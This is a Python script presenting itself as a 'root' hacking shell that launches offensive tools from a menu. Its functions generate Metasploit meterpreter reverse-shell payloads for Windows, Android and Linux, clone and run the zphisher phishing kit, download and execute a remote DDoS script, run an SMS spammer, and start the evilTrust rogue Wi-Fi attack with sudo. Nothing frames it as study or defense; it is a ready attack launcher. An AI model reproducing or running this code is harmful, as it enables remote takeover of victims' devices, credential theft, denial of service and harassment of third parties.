import os

def loop():
	shell()

def shell():
	shell = input("\nroot@yorkox:~# ")

	if shell == "info":
		print("Shell created by Yorkox")
		loop()
	if shell == "exit":
		exit()
	if shell == "msf":
		msf()
		loop()
	if shell == "ls":
		os.system("ls")
		loop()
	if shell == "clear":
		os.system("clear")
		loop()
	if shell == "help":
		print("msf --> Metasploit Payload Creator\nclear -->> Clear the screen\nphishing -->> Opens zphisher tool\nddos -->> Opens ddos tool\nsms -->> SMS Spammer tool\nwifi --> EvilTrus tool by s4vitar")
		loop()
	if shell == "cls":
		os.system("cls")
		loop()
	if shell == "phishing":
		phishing()
		loop()
	if shell == "ddos":
		ddos()
		loop()
	if shell == "sms":
		sms()
		loop()
	if shell == "wifi":
		evilTrust()
		loop()


def msf():

	print("")
	ip = input("Ip -->> ")
	port = input("Port ->> ")
	payload = input("Payload: Windows, Linux, Android -->> ")
	filename = input("FileName -->> ")
	if payload == "Windows":
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+filename+".exe")
		print("Saved on "+filename+".exe")

	if payload == "Android":
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" >> "+filename+".apk")
		print("Saved on "+filename+".apk")

	if payload == "Linux":
		os.system("msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+filename+".elf")
		print("Saved on "+filename+".elf")
	loop()

def phishing():

	print("")
	os.system("rm -r zphisher/ 2>/dev/null")
	os.system("rm -r .sites/ 2>/dev/null")
	os.system("git clone https://github.com/htr-tech/zphisher")
	os.system("mv zphisher/zphisher.sh . && mv zphisher/.sites .")
	os.system("bash zphisher.sh")
	loop()

def ddos():

	print("")
	os.system("rm ddos.py 2>/dev/null")
	os.system("wget https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py")
	os.system("python3 ddos.py")
	loop()

def sms():

	print("")
	os.system("git clone https://github.com/Darkmux/SETSMS")
	os.system("mv SETSMS/* .")
	os.system("rm -r SETSMS/ && chmod 777 SETSMS.sh")
	os.system("bash SETSMS.sh")
	loop()

def evilTrust():

	print("")
	os.system("rm -r evilTrust 2>/dev/null")
	os.system("git clone https://github.com/s4vitar/evilTrust")
	os.system("mv evilTrust/* .")
	os.system("clear")
	os.system("sudo bash evilTrust.sh -m terminal")
	loop()

shell()
